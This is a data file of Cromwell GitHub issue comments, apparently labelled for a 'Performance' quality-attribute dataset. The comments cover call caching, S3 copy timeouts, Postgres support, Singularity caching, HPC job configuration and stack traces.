Performance,"S_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1]: Unrecognized runtime attribute keys: preemptible; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-38 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1 [UUID(0123c178)]: Call cache hit process had 0 total hit failures before completing successfully; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-33 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Could not copy a suitable cache hit for 0123c178:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxx",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:2141,perform,perform,2141,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807,2,"['cache', 'perform']","['cached', 'perform']"
Performance,"S_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977>, or unsubscribe <https://github.com/notifications/unsubscribe-",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:2818,tune,tune,2818,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807,1,['tune'],['tune']
Performance,"Seeing the same thing on grid engine with cromwell-37. grid engine job dispatches and completes just fine but cromwell throws the following:. ```; [2019-02-13 22:18:19,77] [info] DispatchedConfigAsyncJobExecutionActor [bc35173dmyWorkflow.myTask:NA:1]: job id: 8550357; [2019-02-13 22:18:19,78] [info] DispatchedConfigAsyncJobExecutionActor [bc35173dmyWorkflow.myTask:NA:1]: Status change from - to Running; [2019-02-13 22:18:20,81] [warn] DispatchedConfigAsyncJobExecutionActor [bc35173dmyWorkflow.myTask:NA:1]: Fatal exception polling for status. Job will fail.; java.util.concurrent.ExecutionException: Boxed Error; 	at scala.concurrent.impl.Promise$.resolver(Promise.scala:83); 	at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); 	at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); 	at scala.concurrent.Promise$.fromTry(Promise.scala:138); 	at scala.concurrent.Future$.fromTry(Future.scala:635); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync$(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatusAsync(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.standard.StandardAsyncExecutionActor.poll(StandardAsyncExecutionActor.scala:989); 	at cromwell.backend.standard.StandardAsyncExecutionActor.poll$(StandardAsyncExecutionActor.scala:983); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.poll(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustPoll$1(AsyncBackendJobExecutionActor.scala:76); 	at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.scala:61); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.cro",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710:574,concurren,concurrent,574,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710,7,['concurren'],['concurrent']
Performance,Should we confirm the cached-to files are still where they are supposed to be and accessible?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2330#issuecomment-306233790:22,cache,cached-to,22,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2330#issuecomment-306233790,1,['cache'],['cached-to']
Performance,"Since it's been a month I thought I'd post an update. Main items:; - In general I'm having to make a lot more changes to the Scala code than I expected due to queries being written in a way that Postgres doesn't like. (This isn't a criticism, more of a heads-up.) Nothing functional, just refactoring.; - The way `Blob` is handled in Slick+Postgres turns out to be a massive pain. I'm not sure if Slick is lazy-loading these fields or I just don't understand how it works under the hood, but the workaround is that the blobs need to be accessed as part of a transaction, which involved some refactoring of downstream processing.; - Semi-related question: is there a reason why the entire contents of the `importsZip` need to be stored in the database? This quickly leads to an enormous METADATA_ENTRY table - possibly because I have call caching turned on, I haven't checked whether this is the cause yet.; - The auto-incremented fields that are `Option[Long]` in the data model can't be handled the same way in Postgres; I haven't decided whether this is simply different database behavior or a bug somewhere. Anyway I found a workaround for that too.; - I may have messed up and branched from `master` in my fork by mistake, and in any case I'm definitely out of sync with your `develop`. Do you have a preferred workflow to bring my branch up to date, i.e. to minimize the mess in the Git history? (Despite using Git daily I'm still not totally sure what ""best practice"" is.). At this point I can at least run a workflow using Postgres, minus call caching. I'm going to be focusing on completing and testing this in the next couple of weeks.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4759#issuecomment-486370402:411,load,loading,411,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4759#issuecomment-486370402,1,['load'],['loading']
Performance,"Since it's still crickets chirping upstream, and quay.io was down again yesterday, I decided to work a bit on this permanent cache thing. Nobody likes bash scripts. But are python scripts okay? I was wondering what you think about this python script @TMiguelT, @illusional, @vsoch ? The PR where it is created is [here](https://github.com/biowdl/singularity-permanent-cache/pull/1). It is open for feedback. The python script:; - Pulls images to a single location based on environment or command line flag.; - Uses `singularity pull` as the backend.; - Returns the location of the image to stdout.; - Checks if an image is present in the cache. If so, it returns it and does not use `singularity pull` in that case. It does not require any internet connection in that case.; - Utilizes a filelock to prevent cache corruption. It uses flock to do this.; - Has no dependencies. Only a modern version of python is needed (3.5 or higher).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-635927054:125,cache,cache,125,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-635927054,4,['cache'],['cache']
Performance,"Since the latter error message specifies that the input 'a' isn't declared in 'baz', I think it would be good to have the error messages paired, like so:. ```; Unable to load namespace from workflow: ERROR: Call supplies an input 'a' that isn't declared in the 'baz' task (line 6, col 38); ```. and . ```; Unable to load namespace from workflow: ERROR: Call supplies an output 'b' that isn't declared in the 'bar' task (line 4, col 47); ```. And while we are here, I'm curious--why do we display a `^` if it doesn't point to the proper column within the line?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2211#issuecomment-298006112:170,load,load,170,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2211#issuecomment-298006112,2,['load'],['load']
Performance,SingleWorkflowRunnerActor/ServiceRegistryActor/KeyValue#988818050]; java.lang.RuntimeException: Unable to create actor for ActorRef Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/ServiceRegistryActor/KeyValue#988818050]; at cromwell.server.CromwellRootActor$$anonfun$1.applyOrElse(CromwellRootActor.scala:81); at cromwell.server.CromwellRootActor$$anonfun$1.applyOrElse(CromwellRootActor.scala:80); at akka.actor.SupervisorStrategy.handleFailure(FaultHandling.scala:295); at akka.actor.dungeon.FaultHandling$class.handleFailure(FaultHandling.scala:263); at akka.actor.ActorCell.handleFailure(ActorCell.scala:374); at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:459); at akka.actor.ActorCell.systemInvoke(ActorCell.scala:483); at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:282); at akka.dispatch.Mailbox.run(Mailbox.scala:223); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.reflect.InvocationTargetException; at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method); at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62); at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45); at java.lang.reflect.Constructor.newInstance(Constructor.java:423); at akka.util.Reflect$.instantiate(Reflect.scala:65); at akka.actor.ArgsReflectConstructor.produce(IndirectActorProducer.scala:96); at akka.actor.Props.newActor(Props.scala:213); at akka.actor.ActorCell.newActor(ActorCell.scala:562); at akka.actor.ActorCell.create(ActorCell.scala:588); at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:461); ... 8 more; Caused by: ,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1748#issuecomment-265155974:1248,concurren,concurrent,1248,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1748#issuecomment-265155974,1,['concurren'],['concurrent']
Performance,"So I decided I'd personally go look for where `AnyRef` was defined... so I went into my `~/.ivy/cache` directory and found all Scala jars and sources I could with a script and then did a `jar -tf` grepping for AnyRef. [The results](https://gist.github.com/scottfrazer/6274b7a77028818ca018) were that I can't find it anywhere!! This is very odd because things compile for me on other branches. I guess I'm not looking in the right place or something. Even removing my Ivy cache and redownloading _everything_, I still could not find AnyRef defined anywhere. My goal was to find which JAR AnyRef was defined in and then make sure that classpath was included, which would surprise me if it weren't because it's fine on any other branch.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/30#issuecomment-107951835:96,cache,cache,96,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/30#issuecomment-107951835,2,['cache'],['cache']
Performance,"So I did some digging. The bad news: a `docker_pull` command will not work. It cannot be implemented at workflow initialization because at that point in time runtime attributes are not known. These are evaluated when the task is executed. This is due to inputs in WDL being dependent on the outputs of other tasks, which is what makes WDL great, so this cannot (easily) be fixed. So a docker_pull command would have to be executed at task execution time. But then it is redundant. This command can be part of the submit script. . Thanks @TMiguelT for suggesting flock. Together with `singularity exec` I think it can solve this particular use case. The `SINGULARITY_CACHEDIR` environment variable needs to be set to a location on the cluster. Then the following config can work:. ```; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 200; exit-code-timeout-seconds = 120; # 4G Memory by default; runtime-attributes= """"""; Int cpu = 1; Int? memory; String? docker; Int time_minutes = 120; """"""; submit-docker = """"""; # Singularity pull image. ; if [ -z $SINGULARITY_CACHEDIR ]; ; then CACHE_DIR=$HOME/singularity/cache; else CACHE_DIR=$SINGULARITY_CACHEDIR; fi; mkdir -p $CACHE_DIR; LOCK_FILE=$CACHE_DIR/singularity_pull_flock; # flock should work as this is executed at the same node as cromwell.; flock --verbose --exclusive --timeout 900 $LOCK_FILE singularity exec --containall docker://${docker} echo ""succesfully pulled ${docker}!"". # Partition selection; PARTITION=all; MEMORY=${default=""4294967296"" memory}; if [ ${time_minutes} -lt 60 ]; then PARTITION=short; fi; if [ $MEMORY -gt 107374182400 ] ; then PARTITION=highmem ; fi. # Job submission; sbatch \; --partition=$PARTITION \; --job-name=""${job_name}"" \; --chdir=""${cwd}"" \; --time=""${time_minutes}"" \; --cpus-per-task=""${cpu}"" \; --mem=$(echo ""$MEMORY / 1024^2"" | bc) \; --output=""${out}"" \; --error=""${err}"" \; --wrap \; 'singularity exec --containall --bind /",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627379430:891,concurren,concurrent-job-limit,891,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627379430,1,['concurren'],['concurrent-job-limit']
Performance,"So I got the metadata processing from 30s to ~ 300ms, and instead of rebasing this, merging it, and then rebasing the performance branch again I'm gonna close this one and open a new PR with the better algorithm + those changes. Sorry for the reviewers :/",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/970#issuecomment-224965904:118,perform,performance,118,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/970#issuecomment-224965904,1,['perform'],['performance']
Performance,So it appears my proposed changes here fixed call cache hit copy hard linking (except for detritus) but broke input localization hard linking. More investigation needed...,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3532#issuecomment-382680928:50,cache,cache,50,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3532#issuecomment-382680928,1,['cache'],['cache']
Performance,"So sorry for the late response. To the best of my understanding, mysql database is needed to be configured to support the cache function. ; [cromwell_mysql.pdf](https://github.com/broadinstitute/cromwell/files/9853162/cromwell_mysql.pdf)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6484#issuecomment-1289256952:122,cache,cache,122,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6484#issuecomment-1289256952,1,['cache'],['cache']
Performance,"So the gist of how udocker caches things is that it uses a directory similar to Docker, which defaults to [`~/.udocker`](https://github.com/indigo-dc/udocker/blob/master/udocker.py#L137), but you can override that with a config file [described here](https://github.com/indigo-dc/udocker/blob/master/doc/installation_manual.md#9-configuration), to set a custom location, e.g. `reposdir = ""/path/to/cache""`. Within that directory it caches the different layers and images in different subdirectories. I'll write that up into the document.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-464521267:27,cache,caches,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-464521267,3,['cache'],"['cache', 'caches']"
Performance,"So, setting `concurrent-job-limit` to 8 did resolve my issue (and I hit another, unrelated issue instead). However, I don't believe this is the ideal way to resolve this. I (and I assume most other users) want maximum concurrency with my jobs, we just want to avoid this error. If we caught this `Too Many Requests` error, and just waited for a few seconds before retrying these requests, it would surely resolve this issue in a cleaner way.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-435558323:13,concurren,concurrent-job-limit,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-435558323,2,['concurren'],"['concurrency', 'concurrent-job-limit']"
Performance,"Something like this will be great for users who just want something simple. We may need to add warnings to the Cromwell docs depending on how this ticket is implemented. The specific behavior this ticket aims to emulate / implement should be further refined with respect to HSQLDB. Plugging in `file:` will absolutely work for ""hello world"". But if one runs cromwell(s) the wrong way the db may become corrupted/deadlocked negating the ability to call-cache. Many databases have minimal to no support for sharing an embedded instance between concurrent procs. SQLite has the most ""support"" afaik but a) would require _a lot_ of custom Cromwell code, and b) still has other issues such as in NFS environments. Depending on whomever this ticket is aimed at, if they're using an HPC environment like our methods users do we'd have to be careful not to store a multiprocess embedded DB on NFS. Today with HSQLDB `mem:` cromwell uses a pair of ephemeral database connection pools. I'm not sure the behavior if both pools are pointed at the same HSQLDB `file:`, but I think it might work as the docs only warn of connecting from multi-process not multi-pool. The default config mentioned in this ticket may still consider using separate `file:` instances just in case. All issues above have workarounds with varying degrees of difficulty and/or documentation warnings. For example one could clarify the documentation with ""Cromwell only supports one instance connecting to the pair of default _file:_ databases at a time."" Or: ""Cromwell only supports call caching when running a workflow with the same name"" because we did something like generate the db file based on the workflow name. Another option, instead of having multiple processes access the same embedded DB, is to research spinning up a background daemon db process, which do support multiple connections. Links to consider when defining acceptance criteria are below. . Re: our existing/proposed HSQLDB usage; - Cromwell's `database.metadata` an",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3786#issuecomment-398204194:452,cache,cache,452,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3786#issuecomment-398204194,2,"['cache', 'concurren']","['cache', 'concurrent']"
Performance,Something looks like it's got an infinite recursion (from SBT logs):; ```; [0m[[0m[31merror[0m] [0m[0mjava.lang.StackOverflowError[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.util.hashing.MurmurHash3.productHash(MurmurHash3.scala:64)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.util.hashing.MurmurHash3$.productHash(MurmurHash3.scala:211)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.runtime.ScalaRunTime$._hashCode(ScalaRunTime.scala:145)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.Tuple2.hashCode(Tuple2.scala:19)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.runtime.Statics.anyHash(Statics.java:115)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.collection.concurrent.TrieMap$MangledHashing.hash(TrieMap.scala:984)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.collection.concurrent.TrieMap.computeHash(TrieMap.scala:829)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.collection.concurrent.TrieMap.get(TrieMap.scala:844)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.collection.MapLike.contains(MapLike.scala:150)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.collection.MapLike.contains$(MapLike.scala:150)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.collection.concurrent.TrieMap.contains(TrieMap.scala:631)[0m; [0m[[0m[31merror[0m] [0m[0m	at scoverage.Invoker$.invoked(Invoker.scala:34)[0m; [0m[[0m[31merror[0m] [0m[0m	at cloud.nio.impl.drs.DrsCloudNioFileSystemProvider.getHost(DrsCloudNioFileSystemProvider.scala:44)[0m; [0m[[0m[31merror[0m] [0m[0m	at cloud.nio.impl.drs.DrsCloudNioFileSystemProvider.getHost(DrsCloudNioFileSystemProvider.scala:48)[0m; [0m[[0m[31merror[0m] [0m[0m	at cloud.nio.impl.drs.DrsCloudNioFileSystemProvider.getHost(DrsCloudNioFileSystemProvider.scala:48)[0m; [0m[[0m[31merror[0m] [0m[0m	at cloud.nio.impl.drs.DrsCloudNioFileSystemProvider.getHost(DrsCloudNioFileSystemProvider.scala:48)[0m; [0m[[0m[31merror[0m] [0m[0m	at cloud.nio.impl.drs.DrsCloudNioFileSystemProvider.getHost(DrsCloud,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4903#issuecomment-487021855:686,concurren,concurrent,686,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4903#issuecomment-487021855,3,['concurren'],['concurrent']
Performance,"Sorry @cjllanwarne , I just tested with:; ```; [; {; ""includeSubworkflows"": ""false""; }; ]; ``` ; on https://cromwell.caas-prod.broadinstitute.org which has version `36-fde91e6`, the problem appeared to me again:. ```; {; ""status"": ""fail"",; ""message"": ""Task slick.basic.BasicBackend$DatabaseDef$$anon$2@23304acb rejected from slick.util.AsyncExecutor$$anon$2$$anon$1@233013e3[Running, pool size = 200, active threads = 200, queued tasks = 1000, completed tasks = 2178366]""; }; ```; Maybe the query is too ambitious? I should use pagination or more restrictive query instead?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3873#issuecomment-455261953:423,queue,queued,423,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3873#issuecomment-455261953,1,['queue'],['queued']
Performance,"Sorry all. I was WAY off base about that ""scalability"" thing. It turns out, if one shutdowns one's database pool, the database doesn't allow you to open any new connections. :blush:. Perhaps someday, someone will run `ab` against cromwell and see where it really does fall over, but today wasn't that day. Based on the exceptions I saw, I mistakenly thought it was an internal pool being starved, but when I actually attached a debugger, found out it was because the pool wasn't really _there_ anymore. So I closed the #199 with more extensive refactoring. Currently, even with simpler refactoring to remove calling `DataAccess.instance.shutdown()`, there seems to be something else weird in `data_access_singleton` that I need to figure out. I'm getting repeatable test failures on `WorkflowManagerActorSpec`'s ""should Try to restart workflows when there are workflows in restartable states"". Still debugging…",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143084495:42,scalab,scalability,42,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143084495,1,['scalab'],['scalability']
Performance,"Sorry, I'm not sure what you mean. For context, Ruchi has some forthcoming work for the call cache result stuff that will want to do exactly the same db simpleton -> WdlValueSimpleton conversions as the job store.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1350#issuecomment-242883334:93,cache,cache,93,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1350#issuecomment-242883334,1,['cache'],['cache']
Performance,"Speaking as an external contributor: I like this contributing guide. It is short and to the point. Great work!. One question: what if I as an external contributor am interested in maintaining some of the code? For instance the cached-copy localization (#4900 ) is a small self-contained piece of code. Our institute will use that all the time. So I don't mind to fix the bugs in that part of the code. Since WDL is a bigger community than broad, it would be nice if some (self-contained) parts of the code can be maintained by the community as well. A good example would be code for backends that broad doesn't use (as much). EDIT: #4919 would be another great example of code contributed and possibly maintained by the community.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4922#issuecomment-488566852:227,cache,cached-copy,227,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4922#issuecomment-488566852,1,['cache'],['cached-copy']
Performance,SraPath.hashCode(SraPathBuilder.scala:26); 	at scala.runtime.Statics.anyHash(Statics.java:122); 	at scala.util.hashing.MurmurHash3.productHash(MurmurHash3.scala:68); 	at scala.util.hashing.MurmurHash3$.productHash(MurmurHash3.scala:215); 	at scala.runtime.ScalaRunTime$._hashCode(ScalaRunTime.scala:149); 	at cromwell.core.io.DefaultIoCommand$DefaultIoSizeCommand.hashCode(DefaultIoCommand.scala:14); 	at scala.runtime.Statics.anyHash(Statics.java:122); 	at scala.util.hashing.MurmurHash3.productHash(MurmurHash3.scala:68); 	at scala.util.hashing.MurmurHash3$.productHash(MurmurHash3.scala:215); 	at scala.runtime.ScalaRunTime$._hashCode(ScalaRunTime.scala:149); 	at cromwell.core.io.IoPromiseProxyActor$IoCommandWithPromise.hashCode(IoPromiseProxyActor.scala:11); 	at com.google.common.base.Equivalence$Equals.doHash(Equivalence.java:348); 	at com.google.common.base.Equivalence.hash(Equivalence.java:112); 	at com.google.common.cache.LocalCache.hash(LocalCache.java:1696); 	at com.google.common.cache.LocalCache.getIfPresent(LocalCache.java:3956); 	at com.google.common.cache.LocalCache$LocalManualCache.getIfPresent(LocalCache.java:4865); 	at cromwell.engine.io.IoActorProxy$$anonfun$receive$1.applyOrElse(IoActorProxy.scala:25); 	at akka.actor.Actor.aroundReceive(Actor.scala:539); 	at akka.actor.Actor.aroundReceive$(Actor.scala:537); 	at cromwell.engine.io.IoActorProxy.aroundReceive(IoActorProxy.scala:16); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:612); 	at akka.actor.ActorCell.invoke(ActorCell.scala:581); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:268); 	at akka.dispatch.Mailbox.run(Mailbox.scala:229); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:241); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:1,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679399680:1735,cache,cache,1735,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679399680,1,['cache'],['cache']
Performance,"Stack traces show lots of threads on the default dispatcher backed up creating Google credentials like so:. ```; ""cromwell-system-akka.actor.default-dispatcher-49"" #236 prio=5 os_prio=31 tid=0x00007faafe1ff800 nid=0x12903 waiting on condition [0x0000000133659000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000007bb5f1698> (a java.util.concurrent.locks.ReentrantLock$NonfairSync); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:836); at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued(AbstractQueuedSynchronizer.java:870); at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1199); at java.util.concurrent.locks.ReentrantLock$NonfairSync.lock(ReentrantLock.java:209); at java.util.concurrent.locks.ReentrantLock.lock(ReentrantLock.java:285); at com.google.api.client.auth.oauth2.Credential.refreshToken(Credential.java:486); at cromwell.filesystems.gcs.GoogleAuthMode$$anonfun$1.apply$mcZ$sp(GoogleAuthMode.scala:79); at cromwell.filesystems.gcs.GoogleAuthMode$$anonfun$1.apply(GoogleAuthMode.scala:79); at cromwell.filesystems.gcs.GoogleAuthMode$$anonfun$1.apply(GoogleAuthMode.scala:79); at scala.util.Try$.apply(Try.scala:192); at cromwell.filesystems.gcs.GoogleAuthMode$class.validateCredentials(GoogleAuthMode.scala:79); at cromwell.filesystems.gcs.ApplicationDefaultMode.validateCredentials(GoogleAuthMode.scala:138); at cromwell.filesystems.gcs.GoogleAuthMode$class.credential(GoogleAuthMode.scala:64); at cromwell.filesystems.gcs.ApplicationDefaultMode.credential(GoogleAuthMode.scala:138); at cromwell.filesystems.gcs.GoogleAuthMode$class.buildStorage(GoogleAuthMode.scala:95); at cromwell.filesystems.gcs.ApplicationDefaultMode.buildStorage(GoogleAuthMode.scala:138); at cromwell.backend.impl.jes.io.package$.buildFilesystem",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1065#issuecomment-228816798:404,concurren,concurrent,404,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1065#issuecomment-228816798,7,['concurren'],['concurrent']
